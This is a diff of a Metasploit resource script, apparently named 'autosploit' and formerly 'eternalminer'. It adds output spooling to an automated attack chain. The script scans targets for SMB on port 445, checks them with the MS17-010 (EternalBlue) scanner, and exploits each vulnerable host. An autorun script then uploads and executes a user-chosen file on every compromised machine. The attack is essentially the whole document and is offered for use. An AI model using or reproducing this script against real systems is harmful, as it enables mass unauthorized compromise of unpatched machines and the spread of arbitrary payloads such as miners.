@@ -1,5 +1,7 @@
 #name of resource script
-workspace -a eternalminer
+workspace -a autosploit
+
+spool /root/autosploit_output.txt
 
 #get user input
 <ruby>
@@ -14,12 +16,12 @@ autorun_file.puts("upload #{file}")
 autorun_file.puts("execute -f #{file}")
 autorun_file.close
 
-#run nmap
+#run nmap 
 run_single("db_nmap -Pn -p 445 --open #{ip}")
 </ruby>
 
 #EternalBlue scanner
-use auxiliary/scanner/smb/smb_ms17_010
+use auxiliary/scanner/smb/smb_ms17_010 
 <ruby>
 
 #set scanned targets
@@ -44,5 +46,7 @@ run_single("set AutoRunScript multi_console_command -r autorun.rc")
 #executes script on each exploited host
 vulnerable_hosts.each do |rhost|
 	run_single("set RHOST #{rhost}")
-	run_single("exploit -j -z")
+	run_single("exploit -j -z") 
 end
+
+spool off
